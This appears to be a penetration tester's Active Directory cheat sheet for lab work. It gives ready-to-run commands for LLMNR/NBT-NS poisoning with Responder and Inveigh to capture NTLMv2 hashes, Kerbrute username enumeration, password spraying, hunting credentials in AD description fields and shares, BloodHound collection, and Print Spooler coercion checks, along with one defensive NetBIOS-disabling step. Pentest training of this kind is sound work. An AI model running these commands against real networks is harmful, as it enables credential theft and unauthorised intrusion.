# AD Enumeration Techniques

> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`

### Passive Network Capture with Responder (Analyze Mode) [added: 2026-04]
- **Tags:** #Responder #LLMNR #NBTNS #MDNS #PassiveRecon #NetworkCapture #T1557.001
- **Trigger:** On the network with no credentials; need to identify hosts and capture broadcast traffic
- **Prereq:** Network access on target subnet, Responder installed, root/sudo privileges
- **Yields:** Host identification, potential NTLMv2 hashes from broadcast name resolution traffic
- **Opsec:** Low
- **Context:** On the network with no credentials yet -- passively capture LLMNR/NBT-NS/MDNS traffic to identify hosts and potential hash captures
- **Payload/Method:** `sudo responder -I ens224 -A`

### Ping Sweep with fping [added: 2026-04]
- **Tags:** #fping #PingSweep #HostDiscovery #NetworkRecon #ICMP #Enumeration
- **Trigger:** Need quick host discovery on a subnet before deeper scanning
- **Prereq:** Network access to target subnet, fping installed
- **Yields:** List of live hosts responding to ICMP on the target subnet
- **Opsec:** Low
- **Context:** Quick host discovery on a /23 or similar subnet before running nmap
- **Payload/Method:** `fping -asgq 172.16.5.0/23`

### Kerbrute Username Enumeration (No Creds) [added: 2026-04]
- **Tags:** #Kerbrute #UsernameEnum #Kerberos #PreAuth #ASREPRoast #NoCreds #T1589.002
- **Trigger:** No credentials yet; need to enumerate valid domain usernames; port 88 open on DC
- **Prereq:** Network access to DC port 88, domain name known, username wordlist available
- **Yields:** Valid domain usernames; AS-REP hashes for accounts with pre-auth disabled
- **Opsec:** Med
- **Context:** No credentials yet -- enumerate valid domain usernames via Kerberos pre-auth responses; also auto-harvests AS-REP hashes for no-preauth accounts
- **Payload/Method:** `$HOME/Pentester/ptTools/static_binaries/kerbrute/kerbrute_linux_amd64 userenum -d <DOMAIN> --dc <DC_IP> <WORDLIST> -o kerb-results`

### LLMNR/NBT-NS Poisoning with Inveigh (Windows) [added: 2026-04]
- **Tags:** #Inveigh #LLMNR #NBTNS #NTLMCapture #Poisoning #WindowsFoothold #T1557.001
- **Trigger:** On a Windows foothold in the target network; want to capture NTLMv2 hashes passively
- **Prereq:** Windows foothold on target network, Inveigh.ps1 or Inveigh.exe available
- **Yields:** NTLMv2 hashes from hosts making broadcast name resolution requests
- **Opsec:** Med
- **Context:** On a Windows foothold -- poison LLMNR/NBT-NS to capture NTLMv2 hashes from other hosts on the network
- **Payload/Method:**
  ```powershell
  Import-Module .\Inveigh.ps1
  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
  # C# version: .\Inveigh.exe
  ```

### Disable NBT-NS (Defensive Reference) [added: 2026-04]
- **Tags:** #NBTNS #Remediation #Defense #NetBIOS #Hardening #BlueTeam
- **Trigger:** Remediation phase; need to disable NetBIOS on all interfaces to prevent poisoning attacks
- **Prereq:** Administrative access to target hosts, registry write permissions
- **Yields:** NetBIOS disabled on all interfaces, preventing LLMNR/NBT-NS poisoning
- **Opsec:** Low
- **Context:** Remediation step to disable NetBIOS on all interfaces
- **Payload/Method:**
  ```powershell
  $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
  Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose }
  ```

### Password Policy Enumeration (Multiple Tools) [added: 2026-04]
- **Tags:** #PasswordPolicy #LockoutPolicy #CrackMapExec #rpcclient #enum4linux #LDAP #T1201
- **Trigger:** Before password spraying; need to know lockout threshold and password complexity requirements
- **Prereq:** Network access to DC (SMB/RPC/LDAP); credentials optional for some tools (NULL session)
- **Yields:** Account lockout threshold, lockout duration, password complexity requirements, password history length
- **Opsec:** Low
- **Context:** Before password spraying -- enumerate lockout policy to avoid locking accounts
- **Payload/Method:**
  ```bash
  # CrackMapExec (with creds)
  crackmapexec smb 172.16.5.5 -u user -p 'Password123' --pass-pol

  # rpcclient NULL session
  rpcclient -U "" -N 172.16.5.5 -c "querydominfo"

  # enum4linux
  enum4linux -P 172.16.5.5
  enum4linux-ng -P 172.16.5.5 -oA output

  # LDAP
  ldapsearch -h 172.16.5.5 -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

  # Windows native
  net accounts

  # PowerView
  Get-DomainPolicy
  ```

### Password Spraying (Linux — Multiple Tools) [added: 2026-04]
- **Tags:** #PasswordSpraying #Kerbrute #CrackMapExec #rpcclient #BruteForce #CredentialAccess #T1110.003
- **Trigger:** Valid username list obtained; common/default passwords suspected; lockout policy known
- **Prereq:** Valid username list, lockout policy enumerated, Kerbrute/CrackMapExec/rpcclient available
- **Yields:** Valid domain credential pairs (username:password)
- **Opsec:** Med
- **Context:** Have a list of valid usernames and want to test common passwords against the domain
- **Payload/Method:**
  ```bash
  # Kerbrute (fastest, Kerberos-based, no lockout risk if careful)
  kerbrute passwordspray -d DOMAIN.LOCAL --dc 172.16.5.5 valid_users.txt Welcome1

  # CrackMapExec (SMB-based)
  crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

  # CrackMapExec local auth (avoid lockouts on domain)
  crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H <NTLM_HASH> | grep +

  # rpcclient one-liner
  for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
  ```

### Password Spraying (Windows — DomainPasswordSpray) [added: 2026-04]
- **Tags:** #PasswordSpraying #DomainPasswordSpray #WindowsSpray #CredentialAccess #InternalSpray #T1110.003
- **Trigger:** On a domain-joined Windows host; have username list or want to spray all domain users
- **Prereq:** Domain-joined Windows host, DomainPasswordSpray.ps1 loaded, lockout policy known
- **Yields:** Valid domain credential pairs from inside the network
- **Opsec:** Med
- **Context:** On a domain-joined Windows host -- spray from inside the network
- **Payload/Method:**
  ```powershell
  Import-Module .\DomainPasswordSpray.ps1
  Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
  ```

### User Enumeration via SMB/LDAP/RPC (No PowerView) [added: 2026-04]
- **Tags:** #UserEnum #CrackMapExec #smbmap #rpcclient #windapsearch #SMB #LDAP #T1087.002
- **Trigger:** Valid credentials obtained; need to enumerate users, groups, shares, sessions from Linux
- **Prereq:** Valid domain credentials, CrackMapExec/smbmap/rpcclient/windapsearch available
- **Yields:** Domain users, groups, logged-on users, share listings, share file contents
- **Opsec:** Low
- **Context:** Enumerate domain users from Linux with valid creds using various protocols
- **Payload/Method:**
  ```bash
  # CrackMapExec
  crackmapexec smb 172.16.5.5 -u user -p pass --users
  crackmapexec smb 172.16.5.5 -u user -p pass --groups
  crackmapexec smb 172.16.5.5 -u user -p pass --loggedon-users
  crackmapexec smb 172.16.5.5 -u user -p pass --shares

  # Spider shares for interesting files
  crackmapexec smb 172.16.5.5 -u user -p pass -M spider_plus --share Dev-share

  # smbmap
  smbmap -u user -p pass -d DOMAIN.LOCAL -H 172.16.5.5
  smbmap -u user -p pass -d DOMAIN.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only

  # rpcclient
  rpcclient -U "user%pass" 172.16.5.5 -c "enumdomusers"

  # windapsearch
  python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\\user -p pass --da
  python3 windapsearch.py --dc-ip 172.16.5.5 -u domain\\user -p pass -PU
  ```

### BloodHound Collection from Linux [added: 2026-04]
- **Tags:** #BloodHound #bloodhound-python #ADGraph #AttackPath #LinuxCollection #ADEnumeration #T1087.002
- **Trigger:** Valid domain credentials obtained; need full AD graph for attack path analysis
- **Prereq:** Valid domain credentials, bloodhound-python installed, network access to DC
- **Yields:** Full AD object graph (users, groups, computers, ACLs, sessions, trusts) for BloodHound GUI
- **Opsec:** Med
- **Context:** Collect full AD graph data from Linux for offline analysis in BloodHound GUI
- **Payload/Method:**
  ```bash
  bloodhound-python -u 'user' -p 'pass' -ns 172.16.5.5 -d DOMAIN.LOCAL -c all
  zip -r bh_data.zip *.json
  ```

### Security Controls Enumeration (Windows) [added: 2026-04]
- **Tags:** #SecurityControls #Defender #AppLocker #LAPS #CLM #LanguageMode #T1518.001
- **Trigger:** Landed on a Windows foothold; need to assess security controls before running offensive tools
- **Prereq:** Shell access on domain-joined Windows host, PowerShell available
- **Yields:** AV status, AppLocker rules, PowerShell language mode, LAPS deployment status
- **Opsec:** Low
- **Context:** Check AV, AppLocker, PowerShell language mode, and LAPS from a Windows foothold
- **Payload/Method:**
  ```powershell
  # Windows Defender status
  Get-MpComputerStatus

  # AppLocker rules
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

  # PowerShell Language Mode
  $ExecutionContext.SessionState.LanguageMode

  # LAPS (LAPSToolkit)
  Find-LAPSDelegatedGroups
  Find-AdmPwdExtendedRights
  Get-LAPSComputers
  ```

### DNS Zone Dump via LDAP (adidnsdump) [added: 2026-04]
- **Tags:** #adidnsdump #DNSZone #LDAP #HiddenHosts #ADIntegratedDNS #Reconnaissance #T1018
- **Trigger:** Standard enumeration misses hosts; need to resolve all AD-integrated DNS records
- **Prereq:** Valid domain credentials, adidnsdump installed, LDAP access to DC
- **Yields:** All DNS records in AD-integrated zone, including hidden hosts not found by standard enum
- **Opsec:** Low
- **Context:** Resolve all DNS records in the AD-integrated zone -- finds hidden hosts not in standard enum
- **Payload/Method:**
  ```bash
  adidnsdump -u domain\\user ldap://172.16.5.5
  adidnsdump -u domain\\user ldap://172.16.5.5 -r   # resolve unknown records
  ```

### PASSWD_NOTREQD Accounts [added: 2026-04]
- **Tags:** #PASSWD_NOTREQD #UACFlag #WeakAccounts #PowerView #AccountMisconfig #T1078
- **Trigger:** AD enumeration phase; searching for accounts with weak or no password requirements
- **Prereq:** Valid domain credentials, PowerView loaded
- **Yields:** Accounts that may have empty or trivially weak passwords
- **Opsec:** Low
- **Context:** Find accounts where password is not required -- may have blank or weak passwords
- **Payload/Method:** `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`

### Description Field Credential Hunting [added: 2026-04]
- **Tags:** #DescriptionField #CredentialHunting #PasswordInDescription #PowerView #ADEnum #T1552.001
- **Trigger:** Standard password attacks failed; searching for credentials stored in AD attributes
- **Prereq:** Valid domain credentials, PowerView loaded
- **Yields:** Plaintext passwords or hints stored in user description fields by admins
- **Opsec:** Low
- **Context:** Admins sometimes store passwords in the AD description field
- **Payload/Method:** `Get-DomainUser * | Select-Object samaccountname,description`

### Snaffler — Automated Share File Hunting [added: 2026-04]
- **Tags:** #Snaffler #ShareHunting #FileCrawl #SensitiveFiles #Credentials #DataDiscovery #T1083
- **Trigger:** Valid credentials obtained; need to crawl all readable shares for passwords, configs, keys
- **Prereq:** Domain-joined Windows host, Snaffler.exe available, valid domain credentials
- **Yields:** Sensitive files across all readable shares (configs, passwords, SSH keys, certificates)
- **Opsec:** Med
- **Context:** Crawl all readable shares for sensitive files (configs, passwords, keys)
- **Payload/Method:** `.\Snaffler.exe -d DOMAIN.LOCAL -s -v data`

### Printer Bug Check (MS-RPRN Exposure) [added: 2026-04]
- **Tags:** #PrinterBug #MSRPRN #MSPAR #SpoolSample #PetitPotam #Coercion #T1187
- **Trigger:** Planning coercion attacks (unconstrained delegation, NTLM relay); need to verify MS-RPRN/MS-PAR exposure on DC
- **Prereq:** Network access to target DC, rpcdump.py (impacket) available
- **Yields:** Confirmation that Print Spooler RPC is exposed, enabling SpoolSample/PetitPotam coercion
- **Opsec:** Low
- **Context:** Check if MS-RPRN/MS-PAR is exposed on DC -- required for SpoolSample/PetitPotam coercion attacks
- **Payload/Method:**
  ```bash
  rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
  # Windows: Get-SpoolStatus -ComputerName DC01.DOMAIN.LOCAL
  ```

### PowerView Key Enumeration Commands Reference [added: 2026-04]
- **Tags:** #PowerView #ADEnum #QuickReference #DomainTrust #ForestTrust #FindLocalAdminAccess #T1087.002
- **Trigger:** PowerView loaded; need quick reference for common enumeration functions
- **Prereq:** PowerView loaded on domain-joined host, valid domain credentials
- **Yields:** Comprehensive domain enumeration: users, groups, computers, OUs, GPOs, trusts, ACLs, shares, sessions
- **Opsec:** Med
- **Context:** Quick reference for common PowerView domain enumeration functions
- **Payload/Method:**
  ```powershell
  Get-Domain                           # Current domain info
  Get-DomainController                 # List DCs
  Get-DomainUser                       # All users
  Get-DomainComputer                   # All computers
  Get-DomainGroup                      # All groups
  Get-DomainOU                         # All OUs
  Get-DomainGPO                        # All GPOs
  Get-DomainTrust                      # Domain trusts
  Get-ForestTrust                      # Forest trusts
  Get-DomainForeignUser                # Users in groups outside their domain
  Get-DomainForeignGroupMember         # Groups with external members
  Get-DomainTrustMapping               # Full trust map
  Find-InterestingDomainAcl            # Non-default ACLs
  Find-LocalAdminAccess                # Where current user is local admin
  Find-DomainUserLocation              # Where specific users are logged in
  Find-DomainShare                     # Reachable shares
  Find-InterestingDomainShareFile      # Interesting files on shares
  Get-NetLocalGroup                    # Local groups
  Get-NetLocalGroupMember              # Local group members
  Get-NetShare                         # Shares on target
  Get-NetSession                       # Sessions on target
  Test-AdminAccess                     # Check admin access
  ```
